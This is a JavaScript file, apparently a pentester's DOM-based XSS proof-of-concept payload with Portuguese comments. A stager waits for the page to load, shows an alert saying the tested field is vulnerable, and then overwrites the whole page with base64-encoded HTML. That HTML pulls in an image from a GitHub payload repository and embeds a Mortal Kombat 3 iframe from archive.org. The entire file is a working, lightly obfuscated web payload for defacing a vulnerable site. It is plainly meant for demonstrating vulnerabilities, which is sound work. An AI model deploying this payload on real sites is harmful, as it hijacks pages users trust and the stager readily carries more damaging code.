console.log("Teste de XSS DOM Based by André Henrique!! Injetando payload! :D");

// Sobrescrever o corpo do documento
function inject() {
	console.log("Stager: Injetando o iFrame...");
	document.title = "XSS in Pentest by Andre Henrique";
	
	//document.getElementsByTagName('body')[0].innerHTML = '';

	document.addEventListener("DOMContentLoaded", function(event) {
		alert("ISH AVISA:\n\nSe vc estah lendo este aviso, o campo/field testado estah vulneravel a XSS DOM Based!\nIsto significa que um atacante, podera executar codigos JavaScript arbitrariamente\nno dominio " + document.domain + "!\n\nEntao, vamos provar isto jogando o classico Mortal Kombat 3 de 1995!!");

		var pocish = "PGh0bWw+DQo8aGVhZD4NCjxpbWcgc3JjPSIgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21yaGVucmlrZS9JU0hfUGF5bG9hZHMvbWFzdGVyL0lTSC5wbmciIHdpZHRoPSIxMCUiIGhlaWd0aD0iMTAlIiBhbHQ9IiI+DQo8c3R5bGU+DQpib2R5IHsNCiAgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7DQogIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiaHR0cHM6Ly80LmJwLmJsb2dzcG90LmNvbS8teUl2ZHY5T0VWV28vVnFpYXFLVTdndkkvQUFBQUFBQUFSNFUvdnFGY0dqZFZFLXcvczMyMC9DYXJuYXZhbCUyQjEzLmdpZiIpOw0KfQ0KaDEgew0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7DQogIGNvbG9yOiAjZmZmZjAwOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCjxib2R5Pg0KPGNlbnRlcj48aWZyYW1lIHNyYz0iaHR0cHM6Ly9hcmNoaXZlLm9yZy9lbWJlZC9zZ19Nb3J0YWxfS29tYmF0XzNfMTk5NV9BY2NsYWltX01pZHdheV9TY3VscHR1cmVkX1NvZnR3YXJlX1dpbGxpYW1zX0VVX2VuIiBmcmFtZWJvcmRlcj0iMCIgd2Via2l0YWxsb3dmdWxsc2NyZWVuPSJ0cnVlIiBtb3phbGxvd2Z1bGxzY3JlZW49InRydWUiIGFsbG93ZnVsbHNjcmVlbiB3aWR0aD0iNjQwcHgiIGhlaWd0aD0iMzIwcHgiPjwvaWZyYW1lPjxjZW50ZXI+DQo8bWFycXVlZT48aDE+IC0tLS0tLS0tLSBBIElTSCBUZWNub2xvZ2lhLCBEZXNlamEgYSBUb2RvcyB1bSBGZWxpeiBDYXJuYXZhbCEhIC0tLS0tLS0tLS08L2gxPjwvbWFycXVlZT4NCjwvYm9keT4NCjwvaHRtbD4=";

		document.open();
		document.write(atob(pocish));
		document.close();
	});
}

// Verificar se o DOM pode ser injetado imediatamente ou se deve ser chamado por meio de eventos
if (document.readyState === "complete" || document.readyState === "interactive") {
	console.log("Stager: DOM Ok");
	inject();
} else if (window.attachEvent) {
	console.log("Stager: Anexando ao Onload");
	window.attachEvent('onload', inject);
} else if (window.addEventListener) {
	console.log("Stager: Anexando ao Load");
	window.addEventListener('load', inject, false);	
} else {
	console.log("Stager: Fallback para o Contador do iFrame");
	fc = document.getElementsByTagName('iframe').length;
	setInterval(
		function() {
			if (document.getElementsByTagName('iframe').length != fc) {
				return;
			} else {
				inject();
			}
		},
		300
	);
}
